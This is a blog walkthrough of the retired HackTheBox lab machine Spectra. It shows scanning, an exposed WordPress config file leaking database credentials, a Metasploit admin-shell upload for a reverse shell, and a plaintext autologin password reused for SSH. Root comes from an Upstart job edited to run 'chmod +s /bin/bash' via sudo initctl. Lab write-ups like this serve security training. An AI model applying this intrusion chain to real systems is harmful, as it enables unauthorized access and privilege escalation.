---
layout: walkthrough
title: HackTheBox - Spectra
date: 2021-06-27 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/spectra.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at Spectra --`10.10.10.229`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Spectra/Overview.png"  style="width: 65%" />
</p>

## Information Gathering

In order to start the VM, I started with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Spectra$ nmap -sC -sV 10.10.10.229
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-17 10:00 EDT
Nmap scan report for 10.10.10.229
Host is up (0.18s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
80/tcp   open  http    nginx 1.17.4
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql   MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.09 seconds

```

</details>

From the output shown above, we can see that the machine is a Linux machine. As this is a Linux machine and it only has 3 open ports, I started by navigating to the web application.

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Spectra/img1.png"  style="width: 65%" />
</p>

The web application redirected a user to `Spectra.htb/main/index.php` when attempting to access the Software Issue Tracker. After adding `Spectra.htb` to the `/etc/hosts` file and navigating to the “Software Issue Tracker” link, I was redirected to: <http://spectra.htb/main/>.

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Spectra/img2.png"  style="width: 80%" />
</p>

I started by looking through the source code and I found links to the WordPress login site: <http://spectra.htb/main/wp-login.php>. I performed some additional Gobuster scans which revealed additional directories and PHP pages:

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Spectra$ sudo gobuster dir -u http://spectra.htb/ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://spectra.htb/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/quickhits.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/03/17 10:41:02 Starting gobuster
===============================================================
//testing (Status: 301)
===============================================================
2021/03/17 10:41:50 Finished
===============================================================

```
```bat
vagrant@ko:~/Desktop/HackTheBox/Spectra$ sudo gobuster dir -u http://spectra.htb/testing/ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://spectra.htb/testing/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/quickhits.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/03/17 10:42:11 Starting gobuster
===============================================================
//license.txt (Status: 200)
//readme.html (Status: 200)
//wp-config.php.save (Status: 200)
//wp-content/plugins/akismet/akismet.php (Status: 200)
===============================================================
2021/03/17 10:43:05 Finished
===============================================================
```

</details>

As shown above, the Gobuster scans revealed a `wp-config.php.save` file, the PHP code is provided below:

<details>

```php

<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'dev' );

/** MySQL database username */
define( 'DB_USER', 'devtest' );

/** MySQL database password */
define( 'DB_PASSWORD', 'devteam01' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
?>

```

</details>

After reading the source code, I now had the following credentials:
* 'DB_NAME', 'dev' 
* 'DB_USER', 'devtest'
* 'DB_PASSWORD', 'devteam01'

I wasn't able to log in to MySQL remotely, however I was able to log in to the WordPress website with the Administrator account and the password. Since it was WordPress, I ran the `use exploit/unix/webapp/wp_admin_shell_upload` MetaSploit exploit and managed to obtain a reverse shell:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Spectra/img3.png"  style="width: 80%" />
</p>

## Lateral Movement using Nginx
I started off by running linpeas on the host. It didn't contain a ton of useful information but it did point to an `/opt` directory. Within the `/opt` directory, I found the following file: `autologin.conf.orig` which contained information related to a password directory: `/etc/autologin`

<details>

```bash
start on started boot-complete
script
  passwd=
  # Read password from file. The file may optionally end with a newline.
  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
    if [ -e "${dir}/passwd" ]; then
      passwd="$(cat "${dir}/passwd")"
      break
    fi
  done
  if [ -z "${passwd}" ]; then
    exit 0
  fi

```
</details>

The `passwd` file contained a password: `SummerHereWeCome!!`. I used the credentials and attempted to log in to the host via SSH using the `Katie` user account:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Spectra/img4.png"  style="width: 80%" />
</p>

## Privilege Escalation

I started off with some basic enumeration and found that the user was able to run sudo on the following binary:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Spectra/img5.png"  style="width: 80%" />
</p>

In order to exploit this, I looked into the man pages: <https://linux.die.net/man/8/initctl>.

> initctl allows a system administrator to communicate and interact with the Upstartinit(8) daemon.When run as initctl, the first non-option argument is the COMMAND. Global options may be specified before or after the command. You may also create symbolic or hard links to initctl named after command

Since Katie was part of the developers group, I went into the `/etc/init` directory and found that the `test` files were writable by my group:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Spectra/img6.png"  style="width: 80%" />
</p>

I edited the `test.conf` file and inserted the following code:

```bash
script
    chmod +s /bin/bash
end script
```

With the new code added, I ran the script with Sudo and managed to obtain a root shell as shown below:


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Spectra/img7.png"  style="width: 80%" />
</p>

That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.